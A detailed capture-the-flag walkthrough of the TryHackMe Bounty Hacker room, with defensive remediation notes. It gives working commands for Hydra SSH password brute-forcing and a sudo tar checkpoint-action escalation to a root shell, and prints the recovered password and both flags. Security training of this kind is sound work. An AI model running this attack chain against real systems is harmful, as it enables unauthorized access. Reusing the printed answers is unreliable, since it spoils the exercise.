# TryHackMe Bounty Hacker — Detailed Lab Walkthrough

**Lab date:** 24 October 2026  
**Platform:** TryHackMe  
**Room:** Bounty Hacker   

> **Authorized-lab notice:** This walkthrough records testing performed against the TryHackMe Bounty Hacker target assigned for this lab. Only run these techniques against systems you own or have explicit permission to test. The target IP and VPN profile can change when the room is restarted, so use the values supplied by your current TryHackMe session.

---

## 1. Lab overview and learning objectives

The objective of Bounty Hacker was to gain an initial foothold on a Linux target, enumerate the available services, obtain valid user credentials, and then investigate whether the account could escalate its privileges to root.

The complete route was:

1. Connect Kali Linux to the TryHackMe network.
2. Scan the target with Nmap to discover open ports and identify their services.
3. Investigate FTP because anonymous authentication was allowed.
4. Download and inspect `task.txt` and `locks.txt`.
5. Use the task-list signature to identify `lin` as a likely username.
6. Use Hydra to test the candidate passwords against SSH.
7. Log in over SSH as `lin` and capture the user flag.
8. Enumerate the account's sudo permissions.
9. Discover that `/bin/tar` can be executed as root.
10. Use GNU tar's checkpoint action to start a root shell.
11. Read the root flag.

This lab demonstrates how exposed files, weak password hygiene, and an overly broad sudo rule can combine to produce a complete compromise.

## 2. Environment and VPN connection

I used Kali Linux as the attacker machine. TryHackMe provided an OpenVPN configuration file, which I used to join the lab network.

The command used during this session was:

```bash
sudo openvpn /media/sf_DOWN/ap-south-1-abhinavsabu-regular.ovpn
```

### Explanation of the command

- `sudo` runs OpenVPN with administrator privileges. OpenVPN generally needs elevated permissions to create and configure a network tunnel interface and apply routing changes.
- `openvpn` starts the OpenVPN client.
- The path `/media/sf_DOWN/ap-south-1-abhinavsabu-regular.ovpn` points to the configuration file downloaded from TryHackMe. The `.ovpn` file contains connection settings and may also reference certificates or other authentication material.

During the first connection attempt, OpenVPN displayed a DNS resolution error for the VPN endpoint. This meant Kali could not resolve the VPN server's hostname at that time. It was a connectivity/DNS issue rather than evidence that the target machine was vulnerable or that the lab credentials were incorrect. After the VPN connection was working, I could reach the assigned target.

A successful OpenVPN connection normally ends with a message similar to:

```text
Initialization Sequence Completed
```

**Repeatability note:** The VPN profile path shown above is specific to my machine. Download a fresh profile from the TryHackMe Access page if needed. The target IP may also change between room sessions.

## 3. Reconnaissance with Nmap

After connecting to the lab network, I scanned the target:

```bash
nmap -sCV 10.49.168.204
```

### Why I used this command

Nmap is a network discovery and service-enumeration tool. At the beginning of a penetration test, I need to know which network services are reachable before deciding where to investigate.

The command combines two useful options:

- `-sC` runs Nmap's default set of service scripts. These scripts can gather additional information from services, such as whether anonymous FTP is enabled.
- `-sV` probes open ports to identify the service and its version. This provides more context than knowing only that a port is open.
- `10.49.168.204` is the target address assigned by TryHackMe for this session.

The scan reported the following:

| Port | Service | Result |
|---|---|---|
| `21/tcp` | FTP | vsftpd 3.0.5; anonymous FTP login was accepted |
| `22/tcp` | SSH | OpenSSH 8.2p1 on Ubuntu |
| `80/tcp` | HTTP | Apache httpd 2.4.41 on Ubuntu |

### Why the FTP result mattered

Nmap's FTP script reported that anonymous login was allowed. Anonymous FTP can sometimes expose files without requiring a real account. This made FTP a promising first service to examine.

Nmap also reported that it could not retrieve the directory listing through its passive FTP attempt. This did not prove that the files were inaccessible. It indicated that I should try a manual FTP session and see whether another transfer mode worked.

The SSH service was also important because it offered a remote login mechanism. If the FTP files revealed a username and password candidates, SSH could be a place to validate those credentials.

The HTTP service on port 80 was noted as another possible area for investigation, but the FTP service provided a more direct clue at this stage.

## 4. Anonymous FTP access and file retrieval

I connected to the FTP service:

```bash
ftp 10.49.168.204
```

### Explanation

- `ftp` starts the command-line FTP client.
- `10.49.168.204` identifies the server to which the client should connect.
- FTP uses port 21 for its control connection by default, which matched the Nmap finding.

At the username prompt, I entered:

```text
anonymous
```

I left the password blank. The server returned:

```text
230 Login successful.
```

This response confirmed that anonymous authentication had succeeded.

I checked the remote directory:

```ftp
pwd
```

The server reported:

```text
Remote directory: /
```

I then listed the directory:

```ftp
ls
```

The client initially displayed a passive-mode permission warning, but it subsequently completed the listing using active FTP. The files shown were:

```text
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

I downloaded both files:

```ftp
get locks.txt
get task.txt
```

### Explanation of the FTP commands

- `pwd` means “print working directory.” It shows the current directory on the remote FTP server.
- `ls` lists the remote directory contents. It helped identify the files that were exposed.
- `get locks.txt` downloads the remote file named `locks.txt` to the local working directory.
- `get task.txt` downloads the remote file named `task.txt`.
- `bye` closes the FTP session.

I exited the FTP client:

```ftp
bye
```

I could then inspect the downloaded files from my Kali shell.

## 5. Inspecting the downloaded clues

I used:

```bash
cat task.txt
```

The file contained:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

### Why this finding helped

The signature `-lin` suggested that `lin` might be a username associated with the target. It was a clue, not proof that the account existed. I kept it as a candidate and looked for a way to validate it.

Next, I examined the password candidate file:

```bash
cat locks.txt
```

It contained 26 password-like strings. Some examples were:

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
...
RedDr4gonSynd1cat3
...
```

### Why this finding helped

The file looked like a wordlist: a collection of possible passwords. The combination of a likely username (`lin`), a list of candidate passwords, and an SSH service on port 22 suggested a reasonable next test.

A password list by itself does not prove that a credential is valid. The next step was to test the candidates against the SSH authentication service in the authorized lab.

## 6. SSH password testing with Hydra

I used Hydra to test the password candidates for the `lin` account against SSH:

```bash
hydra -l lin -P locks.txt -t 4 ssh://10.49.168.204
```

### Detailed explanation of the Hydra command

Hydra is a login-testing tool that can test candidate credentials against supported authentication services. In this room, I used it only against the TryHackMe target.

- `hydra` starts the Hydra program.
- `-l lin` specifies one username to test. The lowercase `-l` takes a single username.
- `-P locks.txt` supplies a file of password candidates. The uppercase `-P` means a password list; it differs from lowercase `-p`, which supplies one literal password.
- `-t 4` sets four parallel tasks. This controls how many concurrent attempts Hydra makes; it is not the number of passwords in the list.
- `ssh://10.49.168.204` specifies SSH as the service and gives Hydra the target host. SSH uses port 22 by default, which is why the output showed port 22.

Hydra reported a valid credential:

```text
[22][ssh] host: 10.49.168.204
login: lin
password: RedDr4gonSynd1cat3
```

### Why this result was significant

This result validated the username-and-password hypothesis. The password was present in the FTP-exposed candidate list, and the SSH service accepted it for `lin`.

The broader security lesson is that publicly exposed password candidates can make authentication attacks much easier. Organizations should avoid exposing credential material and should use unique, strong passwords, appropriate login protections, and key-based SSH authentication where suitable.

## 7. Logging in over SSH

I connected to the target as `lin`:

```bash
ssh lin@10.49.168.204
```

### Explanation

- `ssh` starts the Secure Shell client.
- `lin@10.49.168.204` specifies the remote username and host.
- SSH uses port 22 by default, matching the service discovered during the Nmap scan.
- The client prompted for the password discovered by Hydra. After I entered it, the server authenticated the session.

The server displayed its Ubuntu login banner and placed me in Lin's Desktop directory.

I verified the account:

```bash
whoami
```

The output was:

```text
lin
```

I listed the current directory:

```bash
ls
```

The output showed:

```text
user.txt
```

I read the user flag:

```bash
cat user.txt
```

The user flag captured in this session was:

```text
THM{CR1M3_SyNd1C4T3}
```

### Explanation of these commands

- `whoami` prints the effective username of the current shell. It confirmed that the SSH session was running as `lin`.
- `ls` lists files in the current directory. It helped locate the user flag file.
- `cat user.txt` prints the contents of the file to the terminal. In this room, the file contained the user flag.

I also checked the current directory and basic host/account information:

```bash
pwd
uname -a
id
```

- `pwd` prints the present working directory. It establishes where I am in the filesystem.
- `uname -a` prints kernel and system information, including the kernel release and architecture. This is useful context during Linux enumeration.
- `id` prints the current user's UID, primary GID, and group memberships. It helps establish the current privilege level and group-based access.

The `id` output showed:

```text
uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

This indicated that I was still a normal user, not root.

## 8. Enumerating sudo permissions

The next step was to check whether `lin` had any privileged command permissions:

```bash
sudo -l
```

### Why I used `sudo -l`

`sudo -l` lists the commands the current user is permitted to run through `sudo`. During Linux privilege enumeration, this is a high-value check because an administrator may have granted a user access to a command that can perform more actions than intended.

The command prompted for Lin's password. The result included:

```text
User lin may run the following commands on ip-10-49-168-204:
    (root) /bin/tar
```

### Interpreting the finding

The `(root)` portion means the command may be run as the root user. `/bin/tar` is the permitted program.

`tar` is normally used to create, list, and extract archives. However, GNU tar has features that can execute an external command at a checkpoint. If a user is allowed to run `tar` as root and can control its arguments, those features can turn the permission into root-level command execution.

The dangerous part was not that archive creation is inherently unsafe. The problem was that the sudo rule allowed a general-purpose utility with command-execution functionality to run as root without sufficiently restricting how it was invoked.

## 9. Understanding the GNU tar checkpoint escalation

The command used in the lab was:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This command used GNU tar's checkpoint feature to execute a shell.

### First, understand the ordinary tar options

- `sudo` asks the system to run the following command with the elevated permissions allowed by the sudoers policy. In this case, the policy permitted `/bin/tar` as root.
- `tar` invokes the archive utility.
- `-c` means “create.” It tells tar to create an archive.
- `-f` means “file.” It specifies the archive file name that follows.
- The first `/dev/null` is the archive destination. `/dev/null` is a special device that discards data written to it, so the command does not need to create a useful archive file on disk.
- The second `/dev/null` is the input path being processed by tar.

The command's archive work is not the privilege escalation by itself. The critical behavior comes from the checkpoint options.

### `--checkpoint=1`

GNU tar can trigger a checkpoint after processing a configured number of records. The value `1` configures a checkpoint interval of one record.

This does **not** mean “run one shell.” It means that tar should reach a checkpoint frequently while processing the archive.

### `--checkpoint-action=exec=/bin/sh`

This tells GNU tar what action to perform when the checkpoint is reached. The `exec` action runs the specified command, which here is `/bin/sh`.

GNU tar's checkpoint action is a legitimate feature used for things such as progress-related actions. It becomes dangerous when the program runs with elevated privileges and the caller is allowed to supply an arbitrary command to execute.

### Why the spawned shell was root

The sudo policy authorized `/bin/tar` to run as root. Tar therefore ran with root privileges. When tar launched `/bin/sh` as its checkpoint action, the shell inherited the elevated privileges of the process that launched it.

The important process relationship is:

```text
lin (ordinary account)
  └── sudo authorizes /bin/tar as root
       └── tar runs with root privileges
            └── checkpoint action executes /bin/sh
                 └── shell has root privileges
```

This is why the shell prompt changed to `#` and why `whoami` returned `root`.

I verified the shell identity:

```bash
whoami
```

The output was:

```text
root
```

I could also verify the numeric identity and groups with:

```bash
id
```

A root shell normally reports UID 0.

### Why this was a sudo misconfiguration, not a kernel exploit

The command did not exploit a kernel flaw or a memory corruption vulnerability in tar. The system had intentionally permitted the user to run tar as root. The escalation came from using a feature of that permitted program that allowed command execution.

The root cause was an overly broad privilege assignment: `lin` could run a powerful, general-purpose program as root while controlling its options.

## 10. Retrieving the root flag

After confirming that the shell was root, I moved into the root user's home directory:

```bash
cd /root
```

I listed the directory:

```bash
ls
```

The output included:

```text
root.txt
snap
```

I read the root flag:

```bash
cat /root/root.txt
```

The root flag captured in this session was:

```text
THM{80UN7Y_h4cK3r}
```

### Explanation of the final commands

- `cd /root` changes the current working directory to root's home directory. An ordinary user would normally be denied access to this location, but the shell now had root privileges.
- `ls` lists the files in the directory and revealed the root flag file.
- `cat /root/root.txt` printed the flag contents.

## 11. Flags captured

| Flag | Value |
|---|---|
| User flag | `THM{CR1M3_SyNd1C4T3}` |
| Root flag | `THM{80UN7Y_h4cK3r}` |

These are the flag values captured during this session. If repeating the room later, verify the flags on your own assigned target.

## 12. Full command sequence for repeating the lab

The following sequence summarizes the commands used. Run each section at the relevant stage of the lab. Replace the VPN file path and target IP if your TryHackMe session provides different values.

### VPN and reconnaissance

```bash
sudo openvpn /media/sf_DOWN/ap-south-1-abhinavsabu-regular.ovpn
nmap -sCV 10.49.168.204
```

### FTP enumeration

```bash
ftp 10.49.168.204
```

Within the FTP client:

```ftp
anonymous
pwd
ls
get locks.txt
get task.txt
bye
```

Inspect the files locally:

```bash
cat task.txt
cat locks.txt
```

### SSH password testing and login

```bash
hydra -l lin -P locks.txt -t 4 ssh://10.49.168.204
ssh lin@10.49.168.204
```

### User enumeration and user flag

Run inside the SSH session as `lin`:

```bash
whoami
pwd
ls
cat user.txt
uname -a
id
sudo -l
```

### Privilege escalation and root flag

Run after confirming the sudo permission for `/bin/tar`:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
id
cd /root
ls
cat /root/root.txt
```

## 13. Defensive lessons and remediation

The room showed how several security weaknesses can combine. A defender should consider each one separately.

### Anonymous FTP

Anonymous FTP exposed files that contained useful clues and password candidates. If anonymous FTP is not required, it should be disabled. If it is required for public distribution, the exposed directory should contain only intentionally public material and should not permit unauthorized uploads or access to sensitive files.

### Password candidate exposure and SSH authentication

The FTP file gave an attacker a ready-made list of password candidates. Sensitive password material should not be stored in a publicly accessible directory. Accounts should use unique, strong passwords, and SSH should be configured with appropriate authentication controls, monitoring, and rate limiting. Where appropriate, SSH public-key authentication can reduce reliance on password authentication.

### Dangerous sudo permissions

The most important defensive lesson was that a sudo rule can be risky even if the permitted program is not itself vulnerable. Utilities that support shell escapes or external command execution should not be granted unrestricted root execution to ordinary users.

If a privileged archive operation is needed, an administrator should prefer a narrowly scoped, reviewed wrapper that performs only the required operation. It should validate inputs and avoid allowing the caller to provide arbitrary tar options or checkpoint commands.

### Least privilege and auditing

Administrators should grant only the capabilities a user needs. Sudo permissions should be reviewed periodically, especially permissions for general-purpose interpreters, editors, archive tools, and utilities that can invoke other programs.

The command below can be used to inspect the current user's effective sudo permissions:

```bash
sudo -l
```

The sudoers configuration should be edited with `visudo`, which checks syntax before saving:

```bash
sudo visudo
```

## 14. Repeat-the-lab checklist

- [ ] Start the Bounty Hacker target and note its current IP address.
- [ ] Connect Kali to the TryHackMe VPN.
- [ ] Run Nmap service and version detection.
- [ ] Identify anonymous FTP access on port 21.
- [ ] Connect to FTP and download `task.txt` and `locks.txt`.
- [ ] Read the task-list signature and recognize `lin` as a username candidate.
- [ ] Use Hydra with `locks.txt` against SSH on port 22.
- [ ] Log in as `lin` using the discovered credential.
- [ ] Verify the user identity and retrieve `user.txt`.
- [ ] Run `sudo -l` and identify `/bin/tar` as a root-permitted command.
- [ ] Understand how the GNU tar checkpoint action executes `/bin/sh`.
- [ ] Verify that the resulting shell is root.
- [ ] Read `/root/root.txt`.
- [ ] Record the security lessons and remediation.

## Conclusion

I completed Bounty Hacker by using methodical enumeration to move from anonymous FTP access to SSH access as `lin`, and then from `lin` to root. FTP exposed the clues and password candidates. Hydra identified the working SSH credential. The user account's sudo permissions revealed that `/bin/tar` could run as root. GNU tar's checkpoint action then executed a shell that inherited root privileges.

The complete attack chain was:

```text
Nmap service enumeration
  → Anonymous FTP login
  → Download task.txt and locks.txt
  → Identify lin as a username candidate
  → Hydra finds an SSH password
  → SSH login as lin
  → Capture user flag
  → sudo -l reveals root access to /bin/tar
  → GNU tar checkpoint action runs /bin/sh
  → Root shell
  → Capture root flag
```

The main takeaway is to enumerate carefully and understand the permissions of every privileged program. A seemingly ordinary utility can become a privilege escalation path when a sudo policy grants more power than the user actually needs.
